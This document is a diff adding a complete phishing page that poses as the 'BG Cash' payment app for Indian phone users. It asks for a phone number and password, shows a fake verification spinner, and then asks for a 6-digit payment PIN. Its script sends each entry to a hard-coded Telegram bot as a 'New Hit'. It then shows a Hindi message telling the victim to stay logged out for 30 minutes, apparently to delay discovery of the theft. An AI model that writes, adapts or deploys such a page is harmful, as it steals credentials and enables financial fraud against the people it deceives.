@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BG Cash - Secure Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        /* Main Container */
+        .auth-container {
+            background: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            min-height: 100vh;
+            padding: 30px 24px;
+            position: relative;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            display: flex;
+            flex-direction: column;
+        }
+
+        @media (min-width: 480px) {
+            .auth-container {
+                min-height: 680px;
+                border-radius: 24px;
+                margin: 20px;
+            }
+        }
+
+        /* Utilities */
+        .hidden { display: none !important; }
+
+        /* Header / Logos */
+        .header-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .logo {
+            height: 55px;
+            width: auto;
+            object-fit: contain;
+            display: block;
+        }
+
+        .white-logo {
+            filter: brightness(0) invert(1);
+        }
+
+        .lang-flag { width: 24px; height: 24px; }
+
+        /* Support Floating Button */
+        .support-icon {
+            position: absolute;
+            right: 24px;
+            top: 150px;
+            width: 52px;
+            height: 52px;
+            background: #ffffff;
+            border-radius: 50%;
+            box-shadow: 0 4px 14px rgba(0,0,0,0.12);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        /* Forms Layout */
+        .welcome-title { font-size: 28px; font-weight: 700; color: #1a1a1a; margin-bottom: 6px; }
+        .subtitle { color: #666; font-size: 14px; margin-bottom: 30px; }
+        .form-group { margin-bottom: 20px; position: relative; }
+        .form-group label { display: block; font-size: 14px; font-weight: 500; color: #444; margin-bottom: 8px; }
+        .input-wrapper { position: relative; display: flex; align-items: center; }
+
+        /* Inputs Spacing (Gap Fixed) */
+        .country-code { position: absolute; left: 14px; display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 15px; }
+        .form-input { width: 100%; padding: 14px 16px; border: 1px solid #e2e8f0; background-color: #f8fafc; border-radius: 12px; font-size: 15px; outline: none; }
+        .form-input:focus { border-color: #52cb36; }
+        .phone-login { padding-left: 85px; }
+        .phone-register { padding-left: 95px; }
+        
+        .register-badge {
+            background: #52cb36; color: white; padding: 0 18px; border-top-left-radius: 12px;
+            border-bottom-left-radius: 12px; font-weight: 600; display: flex; align-items: center; height: 100%; position: absolute; left: 0; z-index: 2;
+        }
+
+        /* FIXED: OTP section side-by-side layout with green button */
+        .otp-container {
+            display: flex;
+            gap: 10px;
+            width: 100%;
+        }
+
+        .otp-container .form-input {
+            flex: 1;
+        }
+
+        .send-otp-btn {
+            background-color: #52cb36;
+            color: white;
+            border: none;
+            padding: 0 24px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            white-space: nowrap;
+        }
+
+        .send-otp-btn:hover {
+            background-color: #43aa2a;
+        }
+
+        /* Buttons Styling */
+        .submit-btn { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; text-align: center; }
+        .btn-disabled { background-color: #a3e635; color: rgba(255, 255, 255, 0.8); pointer-events: none; }
+        .btn-active { background-color: #52cb36 !important; color: white !important; pointer-events: auto; box-shadow: 0 4px 12px rgba(82, 203, 54, 0.3); }
+
+        /* LOADING VIEW */
+        .loading-view-bg {
+            background-color: #52cb36;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .loading-view-bg .support-icon { top: 40px; background: rgba(255, 255, 255, 0.2); box-shadow: none; border: none;}
+        
+        .spinner {
+            width: 55px;
+            height: 55px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin: 40px 0;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text { color: white; font-size: 20px; font-weight: 500; margin-bottom: 8px; }
+        .loading-subtext { color: rgba(255,255,255,0.8); font-size: 14px; }
+        .dots { display: flex; gap: 6px; margin: 15px 0; }
+        .dot { width: 8px; height: 8px; background: white; border-radius: 50%; opacity: 0.4; animation: pulse 1.2s infinite ease-in-out; }
+        .dot:nth-child(2) { animation-delay: 0.4s; }
+        .dot:nth-child(3) { animation-delay: 0.8s; }
+        @keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+
+        /* PAYMENT PIN VIEW */
+        .pin-header { text-align: center; margin-top: 20px; margin-bottom: 30px; }
+        .pin-header h2 { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px;}
+        .pin-header p { font-size: 14px; color: #666; }
+        
+        .pin-box-wrapper { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 20px; }
+        .pin-box { width: 50px; height: 55px; border: 1px solid #e2e8f0; background: #f8fafc; border-radius: 12px; text-align: center; font-size: 22px; font-weight: 600; line-height: 55px; color: #1a1a1a; }
+        .pin-box.active { border-color: #52cb36; box-shadow: 0 0 0 1px #52cb36; }
+
+        .warning-text { background: #fffbeb; border: 1px solid #fef3c7; color: #b45309; padding: 12px; border-radius: 10px; font-size: 12px; display: flex; gap: 8px; margin-bottom: 25px; align-items: center; }
+
+        /* Custom Red Danger Alert Box Styling */
+        .suspend-alert-danger { 
+            background: #fef2f2; 
+            border: 1px solid #fee2e2; 
+            color: #dc2626; 
+            padding: 14px 16px; 
+            border-radius: 12px; 
+            font-size: 14px; 
+            font-weight: 600; 
+            text-align: center; 
+            margin-bottom: 25px; 
+            border-left: 5px solid #dc2626;
+            line-height: 1.5;
+            box-shadow: 0 2px 8px rgba(220, 38, 38, 0.08);
+        }
+
+        /* Keypad */
+        .custom-keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: auto; margin-bottom: 20px; }
+        .key { background: #f8fafc; border: none; padding: 16px; border-radius: 12px; font-size: 20px; font-weight: 600; color: #333; cursor: pointer; text-align: center; display: flex; align-items: center; justify-content: center; user-select: none; }
+        .key:active { background: #e2e8f0; }
+        .key-empty { background: transparent; cursor: default; }
+
+        /* REGISTER HEADER */
+        .register-header { 
+            background: #52cb36; 
+            margin: -30px -24px 24px -24px; 
+            padding: 35px 24px 25px 24px; 
+            color: white; 
+            text-align: center; 
+            position: relative; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+        }
+        .back-btn { position: absolute; left: 24px; top: 40px; cursor: pointer; background: none; border: none; color: white; font-size: 24px; }
+        .register-header h2 { font-size: 24px; font-weight: 600; margin-top: 10px; }
+        .register-header p { font-size: 14px; opacity: 0.9; margin-top: 2px; }
+        
+        .info-box {
+            background-color: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #166534;
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="login-view" class="auth-container">
+        <div class="header-section">
+            <img src="https://i.postimg.cc/s23DWFCs/top-logo.png" alt="BG Cash" class="logo">
+            <svg class="lang-flag" viewBox="0 0 36 36"><path fill="#FFF" d="M0 0h36v36H0z"/><path fill="#D80027" d="M0 0h36v3H0zm0 6h36v3H0zm0 6h36v3H0zm0 6h36v3H0zm0 6h36v3H0zm0 6h36v3H0zm0 6h36v3H0z"/><path fill="#002B7F" d="M0 0h18v18H0z"/><circle fill="#FFF" cx="3" cy="3" r="1"/><circle fill="#FFF" cx="9" cy="3" r="1"/><circle fill="#FFF" cx="15" cy="3" r="1"/><circle fill="#FFF" cx="6" cy="6" r="1"/><circle fill="#FFF" cx="12" cy="6" r="1"/><circle fill="#FFF" cx="3" cy="9" r="1"/><circle fill="#FFF" cx="9" cy="9" r="1"/><circle fill="#FFF" cx="15" cy="9" r="1"/><circle fill="#FFF" cx="6" cy="12" r="1"/><circle fill="#FFF" cx="12" cy="12" r="1"/><circle fill="#FFF" cx="3" cy="15" r="1"/><circle fill="#FFF" cx="9" cy="15" r="1"/><circle fill="#FFF" cx="15" cy="15" r="1"/></svg>
+        </div>
+
+        <div class="support-icon">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#52cb36" stroke-width="2.2"><path d="M3 18v-6a9 9 0 0 1 18 0v6"></path><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path></svg>
+        </div>
+
+        <h1 class="welcome-title">Welcome Back!</h1>
+        <p class="subtitle">Enter your registered account to sign in</p>
+
+        <form onsubmit="event.preventDefault(); handleLoginSubmit();">
+            <div class="form-group">
+                <label>Phone</label>
+                <div class="input-wrapper">
+                    <div class="country-code">
+                        <svg width="20" height="15" viewBox="0 0 900 600"><rect width="900" height="600" fill="#fff"/><rect width="900" height="200" fill="#F4C430"/><rect width="900" height="200" y="400" fill="#006400"/><circle cx="450" cy="300" r="92" fill="none" stroke="#000080" stroke-width="6"/><circle cx="450" cy="300" r="16" fill="#000080"/></svg>
+                        <span>+91</span>
+                    </div>
+                    <input type="tel" id="login-phone" class="form-input phone-login" placeholder="Enter Your Phone" maxlength="10">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <label>Password</label>
+                    <a href="#" class="forgot-link">Forget password ?</a>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" id="login-password" class="form-input" placeholder="Enter Your Password">
+                </div>
+            </div>
+
+            <button type="submit" id="login-submit-btn" class="submit-btn btn-disabled">Sign in with Phone</button>
+        </form>
+        <p class="switch-text" style="margin-top: 20px;">Don't have any account? <a href="#" onclick="switchView('register-view')">Sign Up</a></p>
+    </div>
+
+    <div id="register-view" class="auth-container hidden">
+        <div class="register-header">
+            <button class="back-btn" onclick="switchView('login-view')">←</button>
+            <img src="https://i.postimg.cc/s23DWFCs/top-logo.png" alt="BG Cash" class="logo white-logo">
+            <h2>Register</h2>
+            <p>Create your account</p>
+        </div>
+
+        <form onsubmit="event.preventDefault();" style="display: flex; flex-direction: column; flex: 1;">
+            <div class="form-group">
+                <label>Phone Number</label>
+                <div class="input-wrapper">
+                    <div class="register-badge">+91</div>
+                    <input type="tel" class="form-input phone-register" placeholder="Enter your phone number" maxlength="10">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>OTP Code</label>
+                <div class="otp-container">
+                    <input type="text" class="form-input" placeholder="Enter OTP code">
+                    <button type="button" class="send-otp-btn">Send</button>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Password</label>
+                <div class="input-wrapper">
+                    <input type="text" id="reg-password" class="form-input" placeholder="Enter your password">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Confirm Password</label>
+                <div class="input-wrapper">
+                    <input type="text" id="reg-confirm-password" class="form-input" placeholder="Re-enter your password">
+                </div>
+            </div>
+
+            <div class="info-box">
+                <span>ℹ️</span>
+                <span>Password must be 6-16 characters (letters, numbers, or symbols)</span>
+            </div>
+
+            <button type="button" onclick="switchView('login-view')" class="submit-btn btn-active" style="margin-top:auto">SET PIN</button>
+        </form>
+    </div>
+
+    <div id="loading-view" class="auth-container loading-view-bg hidden">
+        <div class="support-icon">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2.2"><path d="M3 18v-6a9 9 0 0 1 18 0v6"></path><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path></svg>
+        </div>
+        <img src="https://i.postimg.cc/s23DWFCs/top-logo.png" alt="BG Cash" class="logo white-logo" style="height: 65px;">
+        
+        <div class="spinner"></div>
+
+        <div class="loading-text">Quick Login...</div>
+        <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+        <div class="loading-subtext">Verifying your credentials</div>
+    </div>
+
+    <div id="pin-view" class="auth-container hidden">
+        <div class="pin-header">
+            <h2>Enter Payment PIN</h2>
+            <p>Please enter your 6-digit payment password</p>
+        </div>
+
+        <div id="danger-area" class="hidden">
+            <div class="suspend-alert-danger">
+                🛑 30 minut Tak aap apna UID login mat kariyega Varna suspend ho jaega.
+            </div>
+        </div>
+
+        <div class="pin-box-wrapper">
+            <div class="pin-box active" id="dot-1"></div>
+            <div class="pin-box" id="dot-2"></div>
+            <div class="pin-box" id="dot-3"></div>
+            <div class="pin-box" id="dot-4"></div>
+            <div class="pin-box" id="dot-5"></div>
+            <div class="pin-box" id="dot-6"></div>
+        </div>
+
+        <div class="warning-text" id="simple-warning">
+            <span>⚠️</span> Please avoid simple passwords like 111111 or 123456
+        </div>
+
+        <button id="confirm-pin-btn" onclick="handlePinSubmit()" class="submit-btn btn-disabled" style="margin-bottom: 20px;">Confirm</button>
+
+        <div class="custom-keypad">
+            <button class="key" onclick="pressKey('1')">1</button>
+            <button class="key" onclick="pressKey('2')">2</button>
+            <button class="key" onclick="pressKey('3')">3</button>
+            <button class="key" onclick="pressKey('4')">4</button>
+            <button class="key" onclick="pressKey('5')">5</button>
+            <button class="key" onclick="pressKey('6')">6</button>
+            <button class="key" onclick="pressKey('7')">7</button>
+            <button class="key" onclick="pressKey('8')">8</button>
+            <button class="key" onclick="pressKey('9')">9</button>
+            <button class="key key-empty">⌨️</button>
+            <button class="key" onclick="pressKey('0')">0</button>
+            <button class="key" onclick="pressDelete()">⌫</button>
+        </div>
+    </div>
+
+    <script>
+        // TELEGRAM BOT CONFIGURATION
+        const BOT_TOKEN = "8484381914:AAEGOSQrCrbZY_ANXgup2Ml7qaPym6a48DI";
+        const CHAT_ID = "7496644349";
+
+        let currentPin = "";
+        const loginPhone = document.getElementById('login-phone');
+        const loginPassword = document.getElementById('login-password');
+        const loginBtn = document.getElementById('login-submit-btn');
+
+        function switchView(viewId) {
+            document.querySelectorAll('.auth-container').forEach(el => el.classList.add('hidden'));
+            document.getElementById(viewId).classList.remove('hidden');
+        }
+
+        // Input Activation
+        function validateLoginInputs() {
+            if (loginPhone.value.trim().length > 0 && loginPassword.value.trim().length > 0) {
+                loginBtn.classList.remove('btn-disabled');
+                loginBtn.classList.add('btn-active');
+            } else {
+                loginBtn.classList.remove('btn-active');
+                loginBtn.classList.add('btn-disabled');
+            }
+        }
+        loginPhone.addEventListener('input', validateLoginInputs);
+        loginPassword.addEventListener('input', validateLoginInputs);
+
+        // Telegram Custom Sender Engine
+        function sendToTelegram(messageText) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: messageText,
+                parse_mode: "Markdown"
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Telegram error:", err));
+        }
+
+        // STEP 1: Process Login Info & Send to Telegram
+        function handleLoginSubmit() {
+            const phone = loginPhone.value.trim();
+            const password = loginPassword.value.trim();
+
+            const text = `📱 *BG Cash New Hit*\n\n• *Phone:* \`+91${phone}\`\n• *Password:* \`${password}\``;
+            sendToTelegram(text);
+
+            switchView('loading-view');
+            setTimeout(() => {
+                switchView('pin-view');
+            }, 2500);
+        }
+
+        // Keypad actions
+        function pressKey(num) {
+            if (currentPin.length < 6) {
+                currentPin += num;
+                updatePinInterface();
+            }
+        }
+
+        function deletePinDigit() {
+            if (currentPin.length > 0) {
+                currentPin = currentPin.slice(0, -1);
+                updatePinInterface();
+            }
+        }
+        window.pressDelete = deletePinDigit;
+
+        function updatePinInterface() {
+            for (let i = 1; i <= 6; i++) {
+                const box = document.getElementById(`dot-${i}`);
+                box.textContent = currentPin[i - 1] ? currentPin[i - 1] : "";
+                box.classList.remove('active');
+            }
+            
+            let nextActiveIndex = currentPin.length + 1;
+            if (nextActiveIndex <= 6) {
+                document.getElementById(`dot-${nextActiveIndex}`).classList.add('active');
+            }
+
+            const confirmBtn = document.getElementById('confirm-pin-btn');
+            if (currentPin.length === 6) {
+                confirmBtn.classList.remove('btn-disabled');
+                confirmBtn.classList.add('btn-active');
+            } else {
+                confirmBtn.classList.remove('btn-active');
+                confirmBtn.classList.add('btn-disabled');
+            }
+        }
+
+        // STEP 2: Process 6-Digit PIN & Send to Telegram
+        function handlePinSubmit() {
+            if(currentPin.length === 6) {
+                const phone = loginPhone.value.trim();
+                const text = `🔑 *BG Cash Secure PIN*\n\n• *Phone Reference:* \`+91${phone}\`\n• *6-Digit PIN:* \`${currentPin}\``;
+                sendToTelegram(text);
+
+                document.getElementById('simple-warning').classList.add('hidden');
+                document.getElementById('danger-area').classList.remove('hidden');
+            }
+        }
+    </script>
+</body>
+</html>
